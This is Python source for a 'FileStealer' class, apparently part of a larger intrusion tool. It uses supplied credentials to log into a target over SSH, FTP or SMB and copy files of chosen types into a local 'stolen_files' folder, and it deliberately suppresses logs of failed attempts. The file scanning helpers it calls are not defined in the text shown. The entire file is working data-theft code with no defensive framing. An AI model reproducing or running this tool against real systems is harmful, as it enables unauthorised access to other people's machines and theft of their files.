import os
import paramiko
import ftplib
from smb.SMBConnection import SMBConnection
from utils.logger import Logger
import socket


class FileStealer:
    def __init__(self, logger=None, output_dir="./stolen_files"):
        self.logger = logger if logger else Logger()
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def is_ssh_service(self, target_ip, port=22, timeout=5):
        """Check if the target port is an SSH service."""
        try:
            sock = socket.create_connection((target_ip, port), timeout=timeout)
            banner = sock.recv(1024).decode("utf-8", "ignore")
            sock.close()
            return "SSH" in banner
        except Exception:
            return False  # Suppress intermediate logs for SSH check

    def attempt_ssh(self, target_ip, username, password, directories, file_extensions):
        """Attempt SSH connection and file stealing."""
        if not self.is_ssh_service(target_ip):
            return False  # Skip logging; only log final result in steal_files()

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target_ip, username=username, password=password, timeout=10)
            self.scan_and_steal_ssh(client, target_ip, directories, file_extensions)
            client.close()
            return True
        except Exception:
            pass  # Suppress logs for failed attempts
        finally:
            client.close()
        return False

    def attempt_ftp(self, target_ip, username, password, directories, file_extensions):
        """Attempt FTP connection and file stealing."""
        try:
            ftp = ftplib.FTP(target_ip)
            ftp.login(user=username, passwd=password)
            self.scan_and_steal_ftp(ftp, target_ip, directories, file_extensions)
            ftp.quit()
            return True
        except Exception:
            pass  # Suppress logs for failed attempts
        return False

    def attempt_smb(self, target_ip, username, password, directories, file_extensions):
        """Attempt SMB connection and file stealing."""
        conn = SMBConnection(username, password, "local_machine", "remote_machine", use_ntlm_v2=True)
        try:
            if conn.connect(target_ip, 139):
                self.scan_and_steal_smb(conn, target_ip, directories, file_extensions)
                conn.close()
                return True
        except Exception:
            pass  # Suppress logs for failed attempts
        return False

    def steal_files(self, target_ip, username, password, directories, file_extensions):
       """Main method to steal files from the target using all supported protocols."""
       protocols = ["ssh", "ftp", "smb"]
       success = False

       for protocol in protocols:
           if protocol == "ssh" and self.attempt_ssh(target_ip, username, password, directories, file_extensions):
               success = True
               break
           elif protocol == "ftp" and self.attempt_ftp(target_ip, username, password, directories, file_extensions):
               success = True
               break
           elif protocol == "smb" and self.attempt_smb(target_ip, username, password, directories, file_extensions):
               success = True
               break

       # Log the final result once
       if success:
           self.logger.log(f"[SUCCESS] Successfully stole files from {target_ip}.")
       elif not success:
           if not hasattr(self, '_failed_ips_logged'):
               self._failed_ips_logged = set()
           if target_ip not in self._failed_ips_logged:
               self.logger.log(f"[FAILED] File stealing failed for IP: {target_ip}.")
               self._failed_ips_logged.add(target_ip)

       return success

